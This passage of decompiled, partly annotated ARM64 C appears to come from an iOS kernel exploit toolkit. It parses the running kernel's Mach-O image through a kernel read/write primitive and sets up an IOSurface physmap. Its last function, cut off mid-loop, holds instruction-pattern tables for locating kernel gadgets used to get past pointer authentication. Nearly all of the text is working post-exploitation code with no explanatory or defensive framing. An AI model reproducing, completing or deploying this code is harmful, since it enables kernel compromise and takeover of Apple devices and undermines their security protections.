//----- (000000000001972C) ----------------------------------------------------
__int64 __fastcall validate_kaddr_range(__int64 a1, __int64 a2)
{
  if ( (a2 & 7) != 0 || (unsigned __int64)(a2 + 0x1000000000000LL) >= 0xFFFFFFFFEFFFLL )
    return 0LL;
  else
    return a2;
}

//----- (000000000001974C) ----------------------------------------------------
unsigned __int64 __fastcall check_kaddr_in_physmap(struct_krwCtx *krwCtx, unsigned __int64 vaddr)
{
  __int64 v2; // x8
  uint64_t *i; // x9
  unsigned __int64 v4; // x10
  bool v5; // zf
  bool v6; // cc

  if ( vaddr + 0x1000000000000LL >= 0xFFFFFFFFEFFFLL )
  {
    v2 = LODWORD(((uint32_t *)&krwCtx->someMutex)[711]);
    if ( (uint32_t)v2 )
    {
      for ( i = (pthread_mutex_t *)(((uint32_t *)&krwCtx->someMutex) + 758); ; i += 3 )
      {
        v4 = *(i - 1);
        v5 = !v4 || *i == 0;
        v6 = v5 || v4 > vaddr;
        if ( !v6 && *i + v4 > vaddr )
          break;
        if ( !--v2 )
          return 0LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  return vaddr;
}

//----- (00000000000197A8) ----------------------------------------------------
sub_197A8_result macho_find_segment(SearchObj *a1, int /*unused*/ a2)
{
    // ldp x9, x8, [x0]
    void    *obj    = a1->field_0x00;   // x9: the search object
    uint8_t *cursor = a1->base_ptr;   // x8: current search cursor (vm address)

    // ldr x12, [x9]  →  data array base pointer
    uint8_t *data_base = *(uint8_t **)obj;  // x12

    // Find current segment: index stored at [obj+0xc8]
    // Entry i is at data_base + i*56, fields at +0x20 (start) and +0x28 (size)
    uint32_t seg_idx = *(uint32_t *)((uint8_t *)obj + 0xc8);  // w10
    uint8_t *seg_entry = data_base + (uint64_t)seg_idx * 56;

    uint64_t seg_start = *(uint64_t *)(seg_entry + 0x20);  // ldp x11,x10,[x10+0x20]
    uint64_t seg_size  = *(uint64_t *)(seg_entry + 0x28);

    // Check if cursor is within current segment
    if ((uint64_t)cursor - seg_start >= seg_size) {
        // Current segment miss — search all segments
        uint32_t seg_count = *(uint32_t *)((uint8_t *)obj + 0x8);  // [x9+0x8]
        if (seg_count == 0)
            return (sub_197A8_result){0, 0};

        // Walk segment array starting at data_base+0x20
        // Each entry: [base+0x20]=start, [base+0x28]=size, stride=0x38
        uint8_t *entry = data_base + 0x20;  // x12 = data_base+0x28, ldp at -0x8
        uint32_t i = 0;
        for (;;) {
            uint64_t s_start = *(uint64_t *)(entry - 0x8); // ldp x13,x14,[x12,-0x8]
            uint64_t s_size  = *(uint64_t *)(entry);

            if ((uint64_t)cursor - s_start < s_size) {
                // Found containing segment
                *(uint32_t *)((uint8_t *)obj + 0xc8) = i;  // str w11,[x9,#0xc8]
                break;
            }

            i++;
            entry += 0x38;  // next segment

            if (i == seg_count)
                return (sub_197A8_result){0, 0};
        }
    }

    // Optional indirection: if [obj+0x101] != 0, follow pointer at [obj+0xa8]
    void *mapped_obj = obj;
    if (*(uint8_t *)((uint8_t *)obj + 0x101)) {
        mapped_obj = *(void **)((uint8_t *)obj + 0xa8);  // ldr x9,[x9,#0xa8]
    }

    // Compute offset of cursor within mapped region
    // [mapped_obj+0xf0] = mapped base address
    uint64_t mapped_base   = *(uint64_t *)((uint8_t *)mapped_obj + 0xf0);
    uint64_t offset        = (uint64_t)cursor - mapped_base;  // sub x8,x8,x10

    // [mapped_obj+0xb0] = minimum valid offset (start threshold)
    uint64_t min_offset    = *(uint64_t *)((uint8_t *)mapped_obj + 0xb0);
    if (min_offset > offset)
        return (sub_197A8_result){0, 0};

    // Check requested size fits within remaining mapped region
    // a1[2] = requested size
    uint64_t requested     = a1->size;                  // ldr x1,[x0,#0x10]

    // [mapped_obj+0xb8] = mapped region size
    uint64_t mapped_size   = *(uint64_t *)((uint8_t *)mapped_obj + 0xb8);
    uint64_t available     = min_offset + mapped_size - offset; // add+sub
    printf("min 0x%x map 0x%x off 0x%x ; available 0x%x requested 0x%x\n", min_offset, mapped_size, offset, available, requested);

    if (requested > available)
        return (sub_197A8_result){0, 0};

    // Return: x0=offset (relative to mapped_base), x1=requested size
    return (sub_197A8_result){offset, requested};
}

//----- (000000000001984C) ----------------------------------------------------
__int64 get_const_8()
{
  return 8LL;
}

//----- (0000000000019854) ----------------------------------------------------
__int64 __fastcall unmap_macho_image(__int64 a1)
{
  __int64 result; // x0
  uint8_t *v3; // x9
  vm_size_t v4; // x2
  vm_address_t address; // [xsp+8h] [xbp-18h] BYREF

  if ( *(uint8_t *)(a1 + 257) )
    return 0;
  v3 = *(uint8_t **)(a1 + 264);
  if ( !v3 )
    return 4;
  if ( !*(uint64_t *)(a1 + 176) )
    return 4;
  v4 = *(uint64_t *)(a1 + 184);
  if ( !v4 )
    return 4;
  if ( (*v3 & 2) == 0 )
    return 0;
  address = *(uint64_t *)(a1 + 176);
  result = vm_allocate(mach_task_self_, &address, v4, 0x4000);
  if ( !(uint32_t)result )
  {
    bzero(
      *(void **)(a1 + 264),
      ((*(int *)(a1 + 56) + *(uint64_t *)(a1 + 232) - 1LL) & (unsigned __int64)-*(uint32_t *)(a1 + 56)) / *(int *)(a1 + 56));
    return 0;
  }
  return result;
}

//----- (00000000000198FC) ----------------------------------------------------
__int64 __fastcall macho_walk_segment_by_name_impl(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, char a5)
{
  __int64 v9; // x23
  unsigned __int64 v10; // x24
  __int64 result; // x0
  __int64 v12; // x10
  __int64 v13; // x9
  unsigned __int64 v14; // x10
  unsigned __int64 v15; // x19
  unsigned __int64 v16; // x26
  unsigned __int64 v17; // x25

  v9 = a1;
  if ( *(uint8_t *)(a1 + 257) )
    v9 = *(uint64_t *)(a1 + 168);
  v10 = *(uint64_t *)(v9 + 176);
  if ( v10 > a2 || a2 + a3 > *(uint64_t *)(v9 + 184) + v10 )
    return 3;
  result = 0;
  v12 = *(int *)(v9 + 56);
  v13 = v12 + a2 + a3;
  v14 = -(int)v12;
  v15 = v14 & a2;
  v16 = --v13 & v14;
  if ( (v13 & v14) > (v14 & a2) )
  {
    v17 = *(int *)(a1 + 56);
    while ( (*(uint8_t *)(*(uint64_t *)(v9 + 264) + (v15 - v10) / v17) & 1) != 0 && (a5 & 1) == 0 )
    {
      v15 += v17;
      if ( v16 <= v15 )
        return 0;
    }
    if ( has_valid_krw_path(KRWCTX_FROM_RAW_FIELD(v9, 280))
      && krw_ctx_has_read_caps(KRWCTX_FROM_RAW_FIELD(v9, 280))
      && (unsigned int)get_page_size_for_kaddr(*(uint64_t *)(v9 + 280)) > *(uint32_t *)(v9 + 56)
      && v16 - v15 < (unsigned int)get_page_size_for_kaddr(*(uint64_t *)(v9 + 280))
      && a4 > a3 )
    {
      v16 = (*(int *)(v9 + 56) + a2 + a4 - 1) & -*(uint32_t *)(v9 + 56);
      if ( v16 > v15 + (unsigned int)get_page_size_for_kaddr(*(uint64_t *)(v9 + 280)) )
        v16 = v15 + (unsigned int)get_page_size_for_kaddr(*(uint64_t *)(v9 + 280));
    }
    if ( (unsigned int)krw_read_thunk(
                         KRWCTX_FROM_RAW_FIELD(v9, 280),
                         *(uint64_t *)(v9 + 224) - v10 + v15,
                         v16 - v15,
                         (void *)v15) )
    {
      for ( ; v15 < v16; v15 += v17 )
        *(uint8_t *)(*(uint64_t *)(v9 + 264) + (v15 - v10) / v17) |= 1u;
      result = 0;
      **(uint8_t **)(v9 + 264) |= 2u;
    }
    else
    {
      return 5;
    }
  }
  return result;
}

//----- (0000000000019AC4) ----------------------------------------------------
__int64 __fastcall macho_walk_segment_by_name_0(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4)
{
  return macho_walk_segment_by_name_impl(a1, a2, a3, a4, 0);
}

//----- (0000000000019ACC) ----------------------------------------------------
unsigned int __fastcall macho_read_u32(__int64 *a1, __int64 *a2)
{
    SearchObj v5 = {a1, a2, 4};
    unsigned int *result = (unsigned int *)macho_find_segment(&v5, 1).addr;
    if ( !result ) return 0;
    macho_walk_segment_by_name_impl((__int64)a1, (unsigned __int64)result, 4u, 0, 0);
    return *result;
}
// 4: using guessed type int dword_4;

//----- (0000000000019B30) ----------------------------------------------------
unsigned __int64 __fastcall macho_read_u64(__int64 *a1, __int64 *a2)
{
    SearchObj v5 = {a1, a2, 8};
    unsigned __int64 *result = (unsigned __int64 *)macho_find_segment(&v5, 1).addr;
    if ( !result ) return 0;
    macho_walk_segment_by_name_impl((__int64)a1, (unsigned __int64)result, 8, 0, 0);
    return *result;
}
// 8: using guessed type int dword_8;

//----- (0000000000019B98) ----------------------------------------------------
void __usercall macho_walk_segment_by_name(char *s2, __int64 a2, SearchObj *a3)
{
  __int64 v4; // x8
  unsigned __int64 v5; // x22
  __int64 v6; // x8
  unsigned __int64 v7; // x23
  __int128 result; // q0

  v4 = **(uint64_t **)(a2 + 208);
  v5 = v4 + 32;
  v6 = *(unsigned int *)(v4 + 20);
  v7 = v5 + v6;
  if ( v5 >= v5 + v6 )
  {
LABEL_5:
    a3->field_0x00 = 0LL;
    a3->base_ptr = 0LL;
    a3->size = 0LL;
  }
  else
  {
    while ( *(uint32_t *)v5 != 25 || strncmp((const char *)(v5 + 8), s2, 0x10uLL) )
    {
      v5 += *(unsigned int *)(v5 + 4);
      if ( v5 >= v7 )
        goto LABEL_5;
    }
    a3->field_0x00 = a2;
    result = *(__int128 *)(v5 + 24);
    *(__int128 *)&a3->base_ptr = result;
  }
  //return result;
}

//----- (0000000000019C34) ----------------------------------------------------
__n128 macho_getsectbyname(char *seg, __int64 a2, const char *sect, uint64_t *a4)
{
  __int64 v5; // x8
  unsigned __int64 v6; // x24
  __int64 v7; // x8
  unsigned __int64 v8; // x25
  __n128 result; // q0
  __int64 v13; // x26
  __n128 *v14; // x23

  v5 = **(uint64_t **)(a2 + 208);
  v6 = v5 + 32;
  v7 = *(unsigned int *)(v5 + 20);
  v8 = v6 + v7;
  if ( v6 >= v6 + v7 )
  {
LABEL_11:
    *a4 = 0;
    a4[1] = 0;
    a4[2] = 0;
  }
  else
  {
    while ( 1 )
    {
      if ( *(uint32_t *)v6 == 25 && !strncmp((const char *)(v6 + 8), seg, 0x10u) )
      {
        v13 = *(unsigned int *)(v6 + 64);
        if ( (uint32_t)v13 )
          break;
      }
LABEL_4:
      v6 += *(unsigned int *)(v6 + 4);
      if ( v6 >= v8 )
        goto LABEL_11;
    }
    v14 = (__n128 *)(v6 + 72);
    while ( strncmp((const char *)v14, sect, 0x10u) )
    {
      v14 += 5;
      if ( !--v13 )
        goto LABEL_4;
    }
    *a4 = a2;
    result = v14[2];
    *(__n128 *)(a4 + 1) = result;
  }
  return result;
}

//----- (0000000000019D10) ----------------------------------------------------
double macho_find_text_section(__int64 a1, uint64_t *a2)
{
  double result; // d0

  *(uint64_t *)&result = macho_getsectbyname((char *)*(uint64_t *)(a1 + 272), a1, "__text", a2).n128_u64[0];
  return result;
}

//----- (0000000000019D20) ----------------------------------------------------
__int64 __fastcall macho_find_loadcmd_by_name(__int64 a1, char *__s2, unsigned __int64 a3)
{
  __int64 v3; // x8
  unsigned __int64 v4; // x21
  __int64 v5; // x8
  unsigned __int64 i; // x22
  __int64 v9; // x8
  unsigned int v10; // w24
  const char *v12; // x0
  unsigned __int64 v13; // x8
  size_t v14; // x2

  v3 = **(uint64_t **)(a1 + 208);
  v4 = v3 + 32;
  v5 = *(unsigned int *)(v3 + 20);
  for ( i = v4 + v5; v4 < i; v4 += v10 )
  {
    if ( *(uint32_t *)v4 == -2147483595 )
    {
      v9 = *(unsigned int *)(v4 + 24);
      v10 = *(uint32_t *)(v4 + 4);
      if ( (unsigned int)v9 >= 0x20 && v10 > (unsigned int)v9 )
      {
        v12 = (const char *)(v4 + v9);
        v13 = v10 - (unsigned int)v9;
        v14 = v13 <= a3 ? v13 : a3;
        if ( !strncmp(v12, __s2, v14) )
          return *(uint64_t *)(v4 + 8);
      }
    }
    else
    {
      v10 = *(uint32_t *)(v4 + 4);
    }
  }
  return 0;
}

//----- (0000000000019DD4) ----------------------------------------------------
double __fastcall krw_ctx_zero_fields(struct_a1 *a1, struct_krwCtx *krwCtx)
{
  double result; // d0

  result = 0.0;
  a1->oword100 = 0u;
  a1->oword110 = 0u;
  a1->owordE0 = 0u;
  a1->owordF0 = 0u;
  a1->owordC0 = 0u;
  a1->owordD0 = 0u;
  a1->owordA0 = 0u;
  a1->owordB0 = 0u;
  a1->oword80 = 0u;
  a1->oword90 = 0u;
  a1->oword60 = 0u;
  a1->xnuMajorVersion = 0u;
  a1->oword40 = 0u;
  a1->oword50 = 0u;
  a1->oword20 = 0u;
  a1->oword30 = 0u;
  a1->oword0 = 0u;
  a1->oword10 = 0u;
  *((uint64_t *)&a1->oword110 + 1) = KRWCTX_RAW_PTR(krwCtx);
  a1->qword120 = 0LL;
  return result;
}

//----- (0000000000019E04) ----------------------------------------------------
__int64 __fastcall free_macho_image_vm(__int64 a1)
{
  vm_address_t v1; // x1
  uint64_t *v2; // x19
  vm_size_t v3; // x2

  v2 = (uint64_t *)(a1 + 176);
  v1 = *(uint64_t *)(a1 + 176);
  if ( !v1 )
    return 0;
  v3 = *(uint64_t *)(a1 + 184);
  if ( !v3 || vm_deallocate(mach_task_self_, v1, v3) )
    return 0;
  *v2 = 0;
  v2[1] = 0;
  return 1;
}

//----- (0000000000019E58) ----------------------------------------------------
bool __fastcall map_macho_image_vm(__int64 a1)
{
  kern_return_t v2; // w8
  uint64_t result; // x0
  vm_address_t v4; // x1
  vm_size_t v5; // x2
  vm_address_t v6; // x8
  __int64 v7; // x9
  __int64 v8; // x10
  void *v9; // x0
  vm_address_t address; // [xsp+18h] [xbp-18h] BYREF

  address = 0;
  v2 = vm_map(mach_task_self_, &address, *(uint64_t *)(a1 + 232), *(int *)(a1 + 56) - 1LL, 1, 0, 0, 0, 3, 3, 1u);
  result = 0;
  if ( !v2 )
  {
    v4 = *(uint64_t *)(a1 + 176);
    if ( v4 )
    {
      v5 = *(uint64_t *)(a1 + 184);
      if ( v5 )
        vm_deallocate(mach_task_self_, v4, v5);
    }
    v6 = address;
    v8 = *(uint64_t *)(a1 + 224);
    v7 = *(uint64_t *)(a1 + 232);
    *(uint64_t *)(a1 + 176) = address;
    *(uint64_t *)(a1 + 184) = v7;
    *(uint64_t *)(a1 + 240) = v8 - v6;
    v9 = calloc(((*(int *)(a1 + 56) + v7 - 1) & (unsigned __int64)-*(uint32_t *)(a1 + 56)) / *(int *)(a1 + 56), 1u);
    *(uint64_t *)(a1 + 264) = v9;
    return v9 != 0;
  }
  return result;
}

//----- (0000000000019F2C) ----------------------------------------------------
bool __fastcall alloc_kernel_offset_table(__int64 a1, __int64 a2)
{
  unsigned __int64 v5; // x21
  uint32_t *v6; // x22
  char v7; // w8
  __int64 v8; // x8
  char *v9; // x21
  char *v10; // x22
  __int64 v11; // x23
  char *v12; // x24
  __int64 v13; // x8
  uint64_t *v14; // x9
  uint32_t v15[8]; // [xsp+0h] [xbp-50h] BYREF

  *(uint64_t *)(a1 + 208) = (uint64_t)calloc(0x48u, 1u);
  if ( *(uint64_t *)(a1 + 208) )
  {
    if ( krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 280), a2, 32, v15) )
    {
      v5 = v15[5] + 32LL;
      v6 = calloc(v5, 1u);
      if ( v6 )
      {
        if ( krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 280), a2, v5, v6) )
        {
          **(uint64_t **)(a1 + 208) = v6;
          if ( *v6 == -17958194 )
          {
            v7 = 4;
          }
          else
          {
            if ( *v6 != -17958193 )
              return false;
            v7 = 8;
          }
          *(uint8_t *)(a1 + 52) = v7;
          v8 = (unsigned int)v6[5];
          if ( v5 < (unsigned int)(v8 + 32) )
            return false;
          v9 = (char *)(v6 + 8);
          v10 = (char *)v6 + v8 + 32;
          if ( v9 >= v10 )
          {
            return true;
          }
          else
          {
            v11 = 0;
            v12 = v9;
            do
            {
              if ( *(uint32_t *)v12 == 25 && !strcmp(v12 + 8, "__TEXT") )
                v11 = a2 - *((uint64_t *)v12 + 3);
              v12 += *((unsigned int *)v12 + 1);
            }
            while ( v12 < v10 );
            if ( v11 && v9 < v10 )
            {
              do
              {
                if ( *(uint32_t *)v9 == 25 )
                {
                  v13 = *((unsigned int *)v9 + 16);
                  if ( (uint32_t)v13 )
                  {
                    v14 = v9 + 104;
                    do
                    {
                      *v14 += v11;
                      v14 += 10;
                      --v13;
                    }
                    while ( v13 );
                  }
                  *((uint64_t *)v9 + 3) += v11;
                }
                v9 += *((unsigned int *)v9 + 1);
              }
              while ( v9 < v10 );
            }
            return true;
          }
        }
      }
    }
  }
  return false;
}
// 0: using guessed type int def_3E8F0;

//----- (000000000001A0D4) ----------------------------------------------------
bool __fastcall iosurface_physmap_setup_bool(__int64 someStruct, int a2, __int64 a3, unsigned int a4)
{
  return iosurface_physmap_setup(someStruct, a2, a3, a4);
}

//----- (000000000001A0F4) ----------------------------------------------------
bool __fastcall iosurface_physmap_setup(__int64 someStruct, int a2, __int64 a3, unsigned int a4)
{
  bool result; // w0
  __int64 v9; // x23
  int *v10; // x9
  __int64 v11; // x24
  unsigned __int64 v12; // x10
  unsigned __int64 v13; // x11
  unsigned int v16; // w8
  unsigned __int64 v17; // x14
  int v18; // w16
  unsigned int v19; // w15
  unsigned __int64 v20; // x25
  unsigned __int64 v21; // x24
  __int64 v22; // x22
  __int128 v23; // q0
  __int128 v24; // q0
  __int64 v25; // x8
  int8x16_t *v26; // x8
  int8x16_t *v27; // x27
  __int64 v28; // x8
  int8x16_t *v29; // x24
  unsigned __int64 v30; // x26
  int v31; // w22
  int v32; // w23
  unsigned __int64 v33; // x28
  __int64 v34; // x8
  unsigned __int64 v35; // x8
  unsigned __int64 v36; // x8
  __int64 v38; // x8
  int8x16_t v39; // q1
  unsigned __int64 v40; // x8
  unsigned __int64 v41; // x9
  bool v42; // cf
  unsigned __int64 v43; // x9
  void *segments; // x0
  __int64 v44; // [xsp+0h] [xbp-70h]
  uint64_t v45[3]; // [xsp+8h] [xbp-68h] BYREF

  result = alloc_kernel_offset_table(someStruct, a3);
  if ( !result )
    return result;
  *(uint32_t *)(someStruct + 216) = a2;
  *(uint8_t *)(someStruct + 256) = 1;
  v9 = **(uint64_t **)(someStruct + 208);
  v10 = (int *)(v9 + 32);
  v11 = *(unsigned int *)(v9 + 20);
  v12 = v9 + 32 + v11;
  v13 = v12 - 8;
  if ( v9 + 32 >= v12 || v9 + 40 > v12 || (unsigned __int64)v10 > v13 )
    return 0;
  v16 = 0;
  do
  {
    v17 = (unsigned int)v10[1];
    if ( (unsigned int)v17 < 8 || v12 - (unsigned __int64)v10 < v17 )
      break;
    v18 = *v10;
    v19 = 24;
    if ( *v10 <= 10 )
    {
      switch ( v18 )
      {
        case -2147483617:
          goto LABEL_26;
        case -2147483614:
LABEL_24:
          v19 = 48;
          goto LABEL_26;
        case 2:
          goto LABEL_26;
      }
    }
    else if ( v18 > 24 )
    {
      if ( v18 == 34 )
        goto LABEL_24;
      if ( v18 == 25 )
      {
        ++v16;
        v19 = 72;
        goto LABEL_26;
      }
    }
    else
    {
      if ( v18 == 11 )
      {
        v19 = 80;
LABEL_26:
        if ( (unsigned int)v17 < v19 )
          break;
        goto LABEL_27;
      }
      if ( v18 == 13 )
        goto LABEL_26;
    }
LABEL_27:
    v10 = (int *)((char *)v10 + v17);
  }
  while ( (unsigned __int64)v10 < v12 && (unsigned __int64)(v10 + 2) <= v12 && (unsigned __int64)v10 <= v13 );
  if ( !v16 )
    return 0;
  *(uint32_t *)(someStruct + 8) = v16;
  segments = malloc(56LL * v16);
  *(uint64_t *)someStruct = (uint64_t)segments;
  if ( !segments )
    return false;
  *(uint64_t *)(someStruct + 272) = "__TEXT";
  v20 = v9 + 32;
  v21 = v9 + 32 + v11;
  if ( v9 + 32 < v21 )
  {
    v22 = (__int64)segments;
    do
    {
      if ( *(uint32_t *)v20 == 25 )
      {
        if ( *(unsigned int *)(v20 + 64) > ((unsigned __int64)*(unsigned int *)(v20 + 4) - 72) / 0x50 )
          return 0;
        if ( !strcmp((const char *)(v20 + 8), "__TEXT_EXEC") )
          *(uint64_t *)(someStruct + 272) = "__TEXT_EXEC";
        v23 = *(__int128 *)(v20 + 40);
        *(uint64_t *)v22 = someStruct;
        *(__int128 *)(v22 + 8) = v23;
        v24 = *(__int128 *)(v20 + 24);
        *(uint64_t *)(v22 + 24) = someStruct;
        *(__int128 *)(v22 + 32) = v24;
        *(uint64_t *)(v22 + 48) = v20;
        v22 += 56;
      }
      v20 += *(unsigned int *)(v20 + 4);
    }
    while ( v20 < v21 );
    v9 = **(uint64_t **)(someStruct + 208);
  }
  *(int32x2_t *)(someStruct + 40) = vrev64_s32(*(int32x2_t *)(v9 + 4));
  *(uint32_t *)(someStruct + 48) = *(uint32_t *)(v9 + 24);
  if ( (a4 & 0x100) != 0 )
  {
    macho_getsectbyname("__TEXT", someStruct, "__thread_starts", v45);
    if ( v45[2] )
      *(uint8_t *)(someStruct + 156) = 1;
    if ( (a4 & 0x400) != 0 )
    {
      if ( *(uint64_t *)someStruct )
      {
        v25 = *(uint64_t *)(*(uint64_t *)someStruct + 8LL);
        if ( v25 )
          *(uint64_t *)(someStruct + 160) = a3 - v25;
      }
    }
  }
  if ( (a4 & 0x40) != 0 )
    return true;
  v26 = **(int8x16_t ***)(someStruct + 208);
  v27 = v26 + 2;
  v28 = v26[1].u32[1];
  v29 = (int8x16_t *)((char *)v27 + v28);
  if ( v27 >= (int8x16_t *)&v27->i8[v28] )
    return 0;
  v30 = 0;
  v31 = 0;
  v44 = *(int *)(someStruct + 56) - 1LL;
  v32 = a4 & 0x580;
  v33 = a3;
  while ( 2 )
  {
    if ( v27->i32[0] == 25 )
    {
      if ( !strcmp(&v27->i8[8], "__TEXT") )
      {
        *(uint64_t *)(someStruct + 248) = a3 - v27[1].i64[1];
        if ( (a4 & 0x100) != 0 )
          goto LABEL_54;
      }
      else if ( (a4 & 0x100) != 0 )
      {
LABEL_54:
        if ( !strcmp(&v27->i8[8], "__KLD") )
          v31 = 1;
      }
      if ( v32 != 384 )
      {
        v34 = v27[2].i64[0];
        if ( v34 )
        {
          v35 = v27[1].i64[1] + v34;
          if ( v35 > v30 )
            v30 = v35;
        }
      }
      if ( (a4 & 0x400) != 0 && v27[2].i64[0] )
      {
        v36 = v27[1].u64[1];
        if ( v36 < v33 && v36 != 0 )
          v33 = v27[1].u64[1];
      }
      if ( !strcmp(&v27->i8[8], "__LINKEDIT") )
      {
        v38 = v27[1].i64[1];
        v39 = vextq_s8(v27[2], v27[2], 8u);
        if ( v32 == 384 )
          v30 = v27[2].i64[0] + v38;
        *(uint64_t *)(someStruct + 16) = v38;
        *(int8x16_t *)(someStruct + 24) = v39;
      }
    }
    v27 = (int8x16_t *)((char *)v27 + (unsigned int)v27->i32[1]);
    if ( v27 < v29 )
      continue;
    break;
  }
  result = false;
  if ( ((v31 == 0) & (a4 >> 8)) == 0 && v30 )
  {
    if ( (~a4 & 0x500) == 0 && *(uint64_t *)(someStruct + 160) )
      v33 = *(uint64_t *)(someStruct + 160);
    v40 = v33 & ~v44;
    if ( v33 == a3 )
      v40 = a3;
    v41 = (v30 + v44) & ~v44;
    v42 = v41 >= v40;
    v43 = v41 - v40;
    if ( v42 )
    {
      *(uint64_t *)(someStruct + 224) = v40;
      *(uint64_t *)(someStruct + 232) = v43;
      return map_macho_image_vm(someStruct) != 0;
    }
    else
    {
      return 0;
    }
  }
  return result;
}
// 0: using guessed type int def_3E8F0;

//----- (000000000001A4FC) ----------------------------------------------------
bool __fastcall iosurface_physmap_setup_alt(__int64 notctx, int a2, __int64 a3, int a4)
{
  return iosurface_physmap_setup(notctx, a2, a3, a4 | 0x100u);
}

//----- (000000000001A520) ----------------------------------------------------
void __fastcall free_kernel_image_resources(__int64 a1)
{
  void **v2; // x0
  void *v3; // x0

  free_macho_image_vm(a1);
  v2 = *(void ***)(a1 + 208);
  if ( v2 )
  {
    if ( *v2 )
    {
      free(*v2);
      v2 = *(void ***)(a1 + 208);
      *v2 = 0;
    }
    free(v2);
    *(uint64_t *)(a1 + 208) = 0;
  }
  if ( *(uint64_t *)a1 )
  {
    free(*(void **)a1);
    *(uint64_t *)a1 = 0;
  }
  v3 = *(void **)(a1 + 264);
  if ( v3 )
  {
    free(v3);
    *(uint64_t *)(a1 + 264) = 0;
  }
}

//----- (000000000001A58C) ----------------------------------------------------
__int64 __fastcall krw_ctx_setup_physmap(__int64 a1, uint64_t **a2, __int64 a3)
{
  unsigned __int64 v6; // x25
  __int64 result; // x0
  unsigned __int64 v8; // x0
  int v9; // w27
  unsigned __int64 v10; // x0
  struct_krwCtx *v11; // x22
  __int64 v12; // x0
  unsigned __int64 v13; // x22
  __int64 v14; // x28
  __int64 v15; // x23
  int v16; // w0
  struct_krwCtx *v18; // x22
  __int64 v19; // x0
  unsigned __int64 v20; // x21
  __int64 v21; // x23
  __int64 v22; // x0
  __int64 v23; // x22
  __int64 v24; // x23
  int v25; // w24
  __int64 v26; // x21
  unsigned int v27; // w23
  unsigned __int64 v28; // x0
  unsigned int v29; // w21
  unsigned int v30; // w8
  struct physmap_gadget_table *gadgets = (struct physmap_gadget_table *)a1;
  static const uint32_t exceptionReturnWords[11] = {
    0xBAA20010, 0x2E4A0020, 0x3A870028, 0xFFFC0038,
    0x56350048, 0xBE600050, 0x32E50058, 0x7F140420,
    0xEA140568, 0xEA2305C0, 0x2BCB05C8
  };
  static const uint32_t exact2Mask[2] = { 0xFFFFFFFF, 0xFFFFFFFF };
  static const uint32_t exact3Mask[3] = { 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF };
  static const uint32_t exact4Mask[4] = { 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF };
  static const uint32_t ldrX0RetWords[2] = { 0xF9402400, 0xD65F03C0 };
  static const uint32_t movX15BrX17Words[4] = { 0xD280060F, 0x14000000, 0xD280000F, 0x14000000 };
  static const uint32_t movX15BrX21Words[4] = { 0xD28006AF, 0x14000000, 0xD280000F, 0x14000000 };
  static const uint32_t movX15BranchMasks[4] = { 0xFFFFFFFF, 0xFC000000, 0xFFE0001F, 0xFC000000 };
  static const uint32_t mrsSpselRetWords[2] = { 0xD508831F, 0xD65F03C0 };
  static const uint32_t strPacibspLegacyWords[2] = { 0xF9000041, 0xD65F03C0 };
  static const uint32_t strPacibspModernWords[2] = { 0xF9000022, 0xD65F03C0 };
  static const uint32_t movX0RetWords[3] = { 0xAA0003E8, 0x52820002, 0x72A003A2 };
  static const uint32_t movX0X19RetWords[2] = { 0xB2400000, 0x17000000 };
  static const uint32_t movX0X19RetMasks[2] = { 0xFFFFFFFF, 0xFF000000 };
  static const uint32_t adrDataRefWords[4] = { 0xD53B4222, 0xD50343DF, 0xD5087800, 0xD5033FDF };
  static const uint32_t jumpTargetWords[4] = { 0x00010004, 0xDEADDAB7, 0x00000001, 0x00000000 };
  static const uint32_t vmPageArrayWords[5] = { 0xD34EFD08, 0x90000000, 0xF9400000, 0x8B284528, 0x78E13108 };
  static const uint32_t vmPageArrayMasks[5] = { 0xFFFFFFFF, 0x9F000000, 0xFFC00000, 0xFFFFFFFF, 0xFFFFFFFF };

  v6 = *(uint64_t *)algn_480E0;
  if ( strstr((const char *)qword_480D8, "T8020") )
    return 5;
  memcpy(gadgets->exceptionReturnWords, exceptionReturnWords, sizeof(gadgets->exceptionReturnWords));
  gadgets->ldrX0Ret = LOOKUP_KOBJ_PATTERN(a2, ldrX0RetWords, exact2Mask, 2);
  gadgets->movX15BrX17 = LOOKUP_KOBJ_PATTERN(a2, movX15BrX17Words, movX15BranchMasks, 4);
  gadgets->movX15BrX21 = LOOKUP_KOBJ_PATTERN(a2, movX15BrX21Words, movX15BranchMasks, 4);
  gadgets->mrsSpselRet = LOOKUP_KOBJ_PATTERN(a2, mrsSpselRetWords, exact2Mask, 2);
  if ( v6 < 0x918C5A83400LL )
  {
    v9 = -1459420545;
    v8 = LOOKUP_KOBJ_PATTERN(a2, strPacibspLegacyWords, exact2Mask, 2);
  }
  else
  {
    v8 = LOOKUP_KOBJ_PATTERN(a2, strPacibspModernWords, exact2Mask, 2);
    v9 = -1459420449;
  }
  gadgets->strPacibspX1Ret = v8;
  gadgets->pacizaStrX2Ret = LOOKUP_KOBJ_PATTERN(a2, movX0RetWords, exact3Mask, 3);
  gadgets->movX0Ret = LOOKUP_KOBJ_PATTERN(a2, movX0X19RetWords, movX0X19RetMasks, 2) + 8;
  gadgets->movX0X19Ret = LOOKUP_KOBJ_PATTERN(a2, adrDataRefWords, exact4Mask, 4);
  v10 = kobj_snapshot_pattern_search_via_ctx((__int64)a2, (__int64)jumpTargetWords, (__int64)exact4Mask, 4u);
  gadgets->jumpTarget = v10 - 8;
  v11 = KRWCTX_FROM_RAW_FIELD(a3, 32);
  v12 = kread_u64_value(a3, v10 + 16);
  v13 = krw_xpac_vaddr_2(v11, v12);
  v14 = 0;
  while ( 1 )
  {
    v15 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v13 + v14);
    v16 = read_u32_from_kobj_snapshot((__int64)a2, *a2, v13 + v14 + 8);
    if ( (v15 & 0xFC000000) == 0x94000000 && v16 == v9 )
      break;
    v14 += 4;
    if ( (uint32_t)v14 == 4096 )
      goto LABEL_14;
  }
  *(uint64_t *)(a1 + 112) = v13 + (v15 << 38 >> 36) + v14;
LABEL_14:
  v18 = KRWCTX_FROM_RAW_FIELD(a3, 32);
  v19 = kread_u64_value(a3, gadgets->jumpTarget + 24LL);
  v20 = krw_xpac_vaddr_2(v18, v19);
  v21 = 0;
  while ( 1 )
  {
